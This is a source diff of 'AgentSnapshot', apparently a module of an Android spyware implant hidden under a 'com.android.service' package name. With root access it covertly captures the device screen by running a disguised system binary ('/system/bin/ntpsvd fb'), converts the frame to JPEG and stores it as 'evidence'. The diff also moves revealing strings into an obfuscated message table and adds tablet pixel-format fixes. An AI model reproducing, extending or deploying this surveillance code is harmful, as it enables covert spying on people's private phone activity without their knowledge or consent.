@@ -23,6 +23,7 @@ import android.view.Surface;
 import android.view.WindowManager;
 
 import com.android.service.LogR;
+import com.android.service.Messages;
 import com.android.service.Status;
 import com.android.service.auto.Cfg;
 import com.android.service.evidence.EvidenceType;
@@ -43,7 +44,7 @@ public class AgentSnapshot extends AgentBase {
 	private static final int MIN_TIMER = 1 * 1000;
 	private static final long SNAPSHOT_DELAY = 1000;
 
-	private static final String TAG = "AgentSnapshot";
+	private static final String TAG = "AgentSnapshot"; //$NON-NLS-1$
 
 	/** The Constant CAPTURE_FULLSCREEN. */
 	final private static int CAPTURE_FULLSCREEN = 0;
@@ -57,13 +58,13 @@ public class AgentSnapshot extends AgentBase {
 	/** The type. */
 	private int type;
 
-
 	/**
 	 * Instantiates a new snapshot agent.
 	 */
 	public AgentSnapshot() {
-		if (Cfg.DEBUG)
-			Check.log( TAG + " SnapshotAgent constructor");
+		if (Cfg.DEBUG) {
+			Check.log(TAG + " SnapshotAgent constructor") ;//$NON-NLS-1$
+		}
 	}
 
 	/*
@@ -73,9 +74,8 @@ public class AgentSnapshot extends AgentBase {
 	 */
 	@Override
 	public boolean parse(AgentConf conf) {
-		byte[] confParameters = conf.getParams();
-		myConf = Utils.bufferToByteBuffer(confParameters,
-				ByteOrder.LITTLE_ENDIAN);
+		final byte[] confParameters = conf.getParams();
+		myConf = Utils.bufferToByteBuffer(confParameters, ByteOrder.LITTLE_ENDIAN);
 
 		this.delay = myConf.getInt();
 		this.type = myConf.getInt();
@@ -112,51 +112,104 @@ public class AgentSnapshot extends AgentBase {
 	@Override
 	public synchronized void go() {
 		switch (type) {
-			case CAPTURE_FULLSCREEN:
-				if (Cfg.DEBUG)
-					Check.log( TAG + " Snapshot Agent: logging full screen");
-				break;
-	
-			case CAPTURE_FOREGROUND:
-				if (Cfg.DEBUG)
-					Check.log( TAG + " Snapshot Agent: logging foreground window");
-				break;
-	
-			default:
-				if (Cfg.DEBUG)
-					Check.log( TAG + " Snapshot Agent: wrong capture parameter");
-				break;
+		case CAPTURE_FULLSCREEN:
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " Snapshot Agent: logging full screen") ;//$NON-NLS-1$
+			}
+			
+			break;
+
+		case CAPTURE_FOREGROUND:
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " Snapshot Agent: logging foreground window") ;//$NON-NLS-1$
+			}
+			
+			break;
+
+		default:
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " Snapshot Agent: wrong capture parameter") ;//$NON-NLS-1$
+			}
+			
+			break;
 		}
 
 		try {
 			if (Status.self().haveRoot()) {
-				boolean isScreenOn = ListenerStandby.isScreenOn();
-				
+				final boolean isScreenOn = ListenerStandby.isScreenOn();
+
 				if (!isScreenOn) {
-					if(Cfg.DEBUG) Check.log( TAG + " (go): Screen powered off, no snapshot");
+					if (Cfg.DEBUG) {
+						Check.log(TAG + " (go): Screen powered off, no snapshot") ;//$NON-NLS-1$
+					}
 					return;
 				}
-								
-				Display display = ((WindowManager) Status.getAppContext()
-						.getSystemService(Context.WINDOW_SERVICE))
-						.getDefaultDisplay();
-				
+
+				final Display display = ((WindowManager) Status.getAppContext()
+						.getSystemService(Context.WINDOW_SERVICE)).getDefaultDisplay();
+
 				int width, height;
-				int orientation = display.getOrientation();
-				
-				if (orientation == Surface.ROTATION_0 || orientation == Surface.ROTATION_180) {
-					width = display.getWidth();
-					height = display.getHeight();
-				} else {
-					height = display.getWidth();
-					width = display.getHeight();
+				final int orientation = display.getOrientation();
+
+				int w = display.getWidth();
+				int h = display.getHeight();
+
+				boolean isTab = (w == 600 && h == 1024) || (w == 1024 && h == 600);
+
+				if (isTab) {
+					h = display.getWidth();
+					w = display.getHeight();
 				}
 
-				if (Cfg.DEBUG)
-					Check.log( TAG + " (go): w=" + width + " h=" + height);
+				boolean useOrientation = true;
+				boolean useMatrix = true;
 
+				if (!useOrientation || orientation == Surface.ROTATION_0 || orientation == Surface.ROTATION_180) {
+					width = w;
+					height = h;
+				} else {
+					height = w;
+					width = h;
+				}
+
+				if (Cfg.DEBUG) {
+					Check.log(TAG + " (go): w=" + width + " h=" + height) ;//$NON-NLS-1$ //$NON-NLS-2$
+				}
+
+				// 0: invertito blu e rosso
+				// 1: perdita info
+				// 2: invertito blu e verde
+				// no ARGB, no ABGR, no AGRB
 				byte[] raw = getRawBitmap();
-				// int[] pixels = new int[ width * height];
+				
+				if (isTab) {
+					// sul tablet non e' ARGB ma ABGR.
+					byte[] newraw = new byte[raw.length / 2];
+					
+					for (int i = 0; i < newraw.length; i++) {
+						switch (i % 4) {
+							case 0:
+								newraw[i] = raw[i + 2]; // A 3:+2
+								break;
+							case 1:
+								newraw[i] = raw[i]; // R 1:+2 2:+1
+								break;
+							case 2:
+								newraw[i] = raw[i - 2]; // G 2:-1 3:-2
+								break;
+							case 3:
+								newraw[i] = raw[i]; // B 1:-2
+								break;
+						}
+						/*
+						 * if (i % 4 == 0) newraw[i] = raw[i + 2]; // A 3:+2
+						 * else if (i % 4 == 1) newraw[i] = raw[i]; // R 1:+2
+						 * 2:+1 else if (i % 4 == 2) newraw[i] = raw[i - 2]; //
+						 * G 2:-1 3:-2 else if (i % 4 == 3) newraw[i] = raw[i];
+						 * // B 1:-2
+						 */}
+					raw = newraw;
+				}
 
 				if (raw != null) {
 					Bitmap bitmap = Bitmap.createBitmap(width, height, Bitmap.Config.ARGB_8888);
@@ -166,18 +219,26 @@ public class AgentSnapshot extends AgentBase {
 					buffer = null;
 					raw = null;
 
-					if (orientation != Surface.ROTATION_0) {
-						Matrix matrix = new Matrix();
-						
-						if (orientation == Surface.ROTATION_90)
-							matrix.setRotate(270);
-						else if (orientation == Surface.ROTATION_270)
-							matrix.setRotate(90);
-						else if (orientation == Surface.ROTATION_180)
-							matrix.setRotate(180);
+					int rotateTab = 0;
+					
+					if (isTab) {
+						rotateTab = -90;
+					}
+					
+					if (useMatrix && orientation != Surface.ROTATION_0) {
+						final Matrix matrix = new Matrix();
 
-						bitmap = Bitmap.createBitmap(bitmap, 0, 0, width,
-								height, matrix, true);
+						if (orientation == Surface.ROTATION_90) {
+							matrix.setRotate(270 + rotateTab);
+						} else if (orientation == Surface.ROTATION_270) {
+							matrix.setRotate(90 + rotateTab);
+						} else if (orientation == Surface.ROTATION_180) {
+							matrix.setRotate(180 + rotateTab);
+						} else {
+							matrix.setRotate(rotateTab);
+						}
+
+						bitmap = Bitmap.createBitmap(bitmap, 0, 0, width, height, matrix, true);
 					}
 
 					byte[] jpeg = toJpeg(bitmap);
@@ -187,17 +248,17 @@ public class AgentSnapshot extends AgentBase {
 					jpeg = null;
 				}
 			}
-		} catch (Exception ex) {
+		} catch (final Exception ex) {
 			if (Cfg.DEBUG) {
-				Check.log( TAG + " (go) Error: " + ex);
-				Check.log(ex);
+				Check.log(TAG + " (go) Error: " + ex) ;//$NON-NLS-1$
+				Check.log(ex) ;//$NON-NLS-1$
 			}
 		}
 
 	}
 
 	private byte[] getAdditionalData() {
-		final String window = "Desktop";
+		final String window = Messages.getString("11.1"); //$NON-NLS-1$
 
 		final int wlen = window.length() * 2;
 		final int tlen = wlen + 24;
@@ -219,39 +280,46 @@ public class AgentSnapshot extends AgentBase {
 	private byte[] toJpeg(Bitmap bitmap) {
 
 		ByteArrayOutputStream os = new ByteArrayOutputStream();
-		bitmap.compress(Bitmap.CompressFormat.JPEG,
-				SNAPSHOT_DEFAULT_JPEG_QUALITY, os);
+		bitmap.compress(Bitmap.CompressFormat.JPEG, SNAPSHOT_DEFAULT_JPEG_QUALITY, os);
 
-		byte[] array = os.toByteArray();
+		final byte[] array = os.toByteArray();
 		try {
 			os.close();
+			os = null;
 
-		} catch (IOException e) {
-			if (Cfg.DEBUG)
-				Check.log(e);
+		} catch (final IOException e) {
+			if (Cfg.DEBUG) {
+				Check.log(e) ;//$NON-NLS-1$
+			}
 		}
 		return array;
 
 	}
 
 	private byte[] getRawBitmap() {
-		File filesPath = Status.getAppContext().getFilesDir();
-		String path = filesPath.getAbsolutePath();
+		final File filesPath = Status.getAppContext().getFilesDir();
+		final String path = filesPath.getAbsolutePath();
 
-		String getrawpath = "/system/bin/ntpsvd fb";
+		final String getrawpath = Messages.getString("11.2"); //$NON-NLS-1$
+		
 		try {
-			Process localProcess = Runtime.getRuntime().exec(getrawpath);
+			final Process localProcess = Runtime.getRuntime().exec(getrawpath);
 			localProcess.waitFor();
 
-			AutoFile file = new AutoFile(path, "frame");
+			final AutoFile file = new AutoFile(path, Messages.getString("11.3")); //$NON-NLS-1$
 			if (file.exists()) {
 				return file.read();
 			}
-		} catch (IOException e) {
-			if(Cfg.DEBUG) Check.log(e);
-		} catch (InterruptedException e) {
-			if(Cfg.DEBUG) Check.log(e);
+		} catch (final IOException e) {
+			if (Cfg.DEBUG) {
+				Check.log(e) ;//$NON-NLS-1$
+			}
+		} catch (final InterruptedException e) {
+			if (Cfg.DEBUG) {
+				Check.log(e) ;//$NON-NLS-1$
+			}
 		}
+		
 		return null;
 	}
 
